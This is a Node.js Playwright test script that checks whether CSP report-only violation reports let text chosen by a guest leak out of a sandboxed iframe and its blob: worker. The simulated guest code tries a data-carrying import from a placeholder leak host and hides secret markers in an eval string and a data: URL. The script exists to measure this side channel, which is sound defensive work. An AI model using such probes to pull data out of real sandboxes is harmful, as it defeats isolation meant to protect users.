// P1: the design's static served file (guard + C in markup + C's blob: worker) served with a site-wide
// report-only header. What reaches the site's report-uri from C and from the worker, and does any of it carry text the
// guest chose? Usage: node p1-outside-report-only.mjs
import http from 'node:http';
import crypto from 'node:crypto';
import { createRequire } from 'node:module';
const require = createRequire('/home/user/web-sandbox/package.json');
const pw = require('playwright');

const sha = (t) => `'sha256-${crypto.createHash('sha256').update(t).digest('base64')}'`;
const esc = (s) => s.replaceAll('&', '&amp;').replaceAll('"', '&quot;').replaceAll('<', '&lt;').replaceAll('>', '&gt;');

const GUARD = `if (!(self.origin === 'null' && top !== self)) window.stop();`;
// The worker stands for guest code: a dynamic import of a URL that carries data (what the entry scan refuses today),
// and a string to eval (what refuseCodeFromStrings refuses today).
const WORKER = `try { import('https://leak.invalid/GUEST-SECRET-IMPORT').catch(() => {}); } catch (e) {}
try { eval('/* GUEST-SECRET-EVAL */ 1'); } catch (e) {}
postMessage('w-done');`;
// C stands for the view: one blob: image (what a guest's image file is), one style with a data: URL in it
// (what the view's CSS URL cut drops today), then the worker.
const C_SCRIPT = `
const img = new Image(); img.src = URL.createObjectURL(new Blob([new Uint8Array([137,80,78,71,13,10,26,10])], { type: 'image/png' })); document.body.append(img);
const d = document.createElement('div'); d.style.backgroundImage = 'url("data:image/png;base64,R1VFU1QtU0VDUkVULUNTUw==")'; document.body.append(d);
const w = new Worker(URL.createObjectURL(new Blob([${JSON.stringify(WORKER)}], { type: 'text/javascript' })));
w.onmessage = () => parent.parent.postMessage('c-done', '*');
`;
const C_DOC = `<!doctype html><meta charset="utf-8"><body><script>${C_SCRIPT}</script></body>`;
const POLICY = `default-src 'none'; script-src ${sha(GUARD)} ${sha(C_SCRIPT)}; script-src-attr 'none'; style-src blob:; img-src blob:; font-src blob:; media-src blob:; connect-src 'none'; worker-src blob:; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'`;
const F = `<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="${esc(POLICY)}"><meta charset="utf-8"><script>${GUARD}</script></head><body><iframe sandbox="allow-scripts allow-forms" srcdoc="${esc(C_DOC)}"></iframe></body></html>`;
const HOST = `<!doctype html><meta charset="utf-8"><body><script>
addEventListener('message', (e) => { if (e.data === 'c-done') document.title = 'done'; });
const f = document.createElement('iframe'); f.setAttribute('sandbox', 'allow-scripts'); f.setAttribute('referrerpolicy', 'no-referrer'); f.src = '/f.html'; document.body.append(f);
</script></body>`;

const HEADERS = {
    'none': null,
    'report-only default-src self': ['Content-Security-Policy-Report-Only', "default-src 'self'; report-uri /r"],
    "report-only default-src self 'report-sample'": ['Content-Security-Policy-Report-Only', "default-src 'self' 'report-sample'; script-src 'self' 'report-sample'; report-uri /r"],
};

let reports = [];
let outside = null;
const server = http.createServer((req, res) => {
    if (req.method === 'POST' && req.url === '/r') {
        let b = ''; req.on('data', (c) => (b += c)); req.on('end', () => { reports.push(b); res.end(); });
        return;
    }
    const headers = { 'Content-Type': 'text/html; charset=utf-8' };
    if (req.url === '/f.html') { if (outside) headers[outside[0]] = outside[1]; res.writeHead(200, headers); res.end(F); return; }
    if (req.url === '/host.html') { res.writeHead(200, headers); res.end(HOST); return; }
    res.writeHead(404); res.end();
});
await new Promise((r) => server.listen(0, '127.0.0.1', r));
const port = server.address().port;

for (const engine of ['chromium', 'firefox', 'webkit']) {
    const browser = await pw[engine].launch();
    for (const [name, header] of Object.entries(HEADERS)) {
        outside = header; reports = [];
        const page = await (await browser.newContext()).newPage();
        await page.goto(`http://localhost:${port}/host.html`);
        try { await page.waitForFunction(() => document.title === 'done', null, { timeout: 5000 }); } catch { }
        await new Promise((r) => setTimeout(r, 1500));
        const summary = reports.map((b) => {
            try { const j = JSON.parse(b)['csp-report']; return `${j['effective-directive'] || j['violated-directive']} doc=${(j['document-uri'] || '').slice(0, 40)} blocked=${(j['blocked-uri'] || '').slice(0, 60)} sample=${(j['script-sample'] || '').slice(0, 40)}`; } catch { return b.slice(0, 120); }
        });
        const secrets = reports.filter((b) => b.includes('GUEST-SECRET') || b.includes('R1VFU1QtU0VDUkVULUNTUw')).length;
        console.log(`${engine} | ${name} | done=${await page.title()} | reports=${reports.length} | carrying guest text=${secrets}`);
        for (const s of summary) console.log('    ' + s);
        await page.context().close();
    }
    await browser.close();
}
server.close();
